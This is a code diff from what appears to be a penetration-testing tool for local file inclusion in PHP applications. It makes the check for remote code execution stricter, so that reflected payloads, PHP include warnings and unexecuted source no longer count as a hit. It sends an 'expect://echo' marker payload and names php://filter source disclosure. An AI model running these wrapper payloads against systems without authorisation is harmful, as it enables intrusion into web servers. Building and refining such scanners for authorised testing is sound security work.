@@ -44,6 +44,15 @@ def _echo_marker() -> str:
     return "LFIMX" + secrets.token_hex(4)
 
 
+# Signs that PHP raised an inclusion/stream error rather than executing code.
+_PHP_ERROR = re.compile(
+    r"(<b>)?(Warning|Fatal error|Notice|Parse error)(</b>)?\s*:"
+    r"|Failed opening|failed to open stream"
+    r"|Unable to (find|create)",
+    re.IGNORECASE,
+)
+
+
 class WrapperSourceTechnique(Technique):
     name = "php-filter-source"
     description = "php://filter base64 source disclosure"
@@ -142,13 +151,26 @@ class WrapperRceTechnique(Technique):
         yield from self._try_expect(ctx, log)
 
     def _confirm_echo(self, resp, marker: str) -> bool:
-        # A successful, evaluated `echo MARKER;` returns the bare marker but NOT
-        # the surrounding PHP tags (those would appear if code was not executed).
-        return (
-            resp.ok
-            and marker in resp.text
-            and "<?php" not in resp.text.split(marker)[0][-30:]
-        )
+        """True only when an evaluated ``echo MARKER`` produced the bare marker.
+
+        Rejects two common false positives seen against real PHP:
+        * the payload bounced back inside a PHP ``include()`` warning (e.g. an
+          unavailable wrapper), which reflects ``echo MARKER`` verbatim, and
+        * the raw source being echoed rather than executed (PHP tags present).
+        """
+        if not resp.ok or marker not in resp.text:
+            return False
+        text = resp.text
+        # A wrapper that failed to execute leaves a PHP error in the body.
+        if _PHP_ERROR.search(text):
+            return False
+        # Our own payload reflected back (…echo 'MARKER'… or echo MARKER).
+        if f"echo '{marker}'" in text or f"echo {marker}" in text:
+            return False
+        # Executed output must not sit right after a literal opening PHP tag.
+        if "<?php" in text.split(marker)[0][-30:]:
+            return False
+        return True
 
     def _finding(self, ctx, resp, payload, marker, vector) -> Finding:
         return Finding(
@@ -211,6 +233,6 @@ class WrapperRceTechnique(Technique):
         marker = _echo_marker()
         payload = f"expect://echo {marker}"
         resp = ctx.point.send(ctx.client, payload)
-        if resp.ok and marker in resp.text:
+        if self._confirm_echo(resp, marker):
             log.good(f"RCE confirmed via expect:// on {ctx.point.describe()}")
             yield self._finding(ctx, resp, payload, marker, "expect:// wrapper")
